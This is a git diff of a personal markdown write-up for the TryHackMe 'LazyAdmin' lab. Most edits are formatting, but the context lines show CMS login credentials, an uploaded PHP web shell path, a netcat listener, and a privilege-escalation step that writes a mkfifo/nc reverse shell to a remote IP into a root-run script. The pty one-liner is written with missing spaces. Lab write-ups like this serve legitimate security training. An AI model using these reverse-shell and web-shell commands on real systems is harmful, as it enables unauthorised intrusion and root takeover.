@@ -1,3 +1,11 @@
+---
+title: TryHackMe - LazyAdmin
+author: Bonface
+date: 2024-10-31 00:00:00 +0000
+categories: [TryHackMe]
+tags: [tryhackme, linux, nmap, privesc, ssh, http, gobuster ]
+---
+
 # LazyAdmin
 
 Easy Linux machine to practice your skills.  
@@ -44,7 +52,7 @@ To Do List
 
 
 
-# site
+##  site
 
 ![[Pasted image 20241028210430.png]]
 
@@ -110,7 +118,8 @@ nc -nlvp 1234
 
 ## ip `10.10.66.184`
 
-## Commands,will have to start all over again :
+## Commands
+will have to start all over again :
 1. 10.10.66.184/content/as
 2. user = manager
 3. password = Password123
@@ -118,8 +127,8 @@ nc -nlvp 1234
 5. nc -nvlp 1234
 6. `http://10.10.66.184/content/inc/ads/shell.php`
 
-now we have a shell !!!
----
+**now we have a shell !!!**
+
 ![[Pasted image 20241028210653.png]]
 
 user flag = THM{...}
@@ -127,8 +136,8 @@ user flag = THM{...}
 
 
 
-priv esc
--------------------------------------------------------
+# priv esc
+
 First lets stablelize the shell.  
 ```sh
 python3 -c'importpty;pty.spawn("/bin/bash")'
@@ -143,7 +152,7 @@ Runs the command with root previlage and we can read and execute it.
 The script runs another script  
 ![[Pasted image 20241028210833.png]]
 
-## Command 
+
 ```sh
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.172.59 5554 >/tmp/f' >/etc/copy.sh
 ```
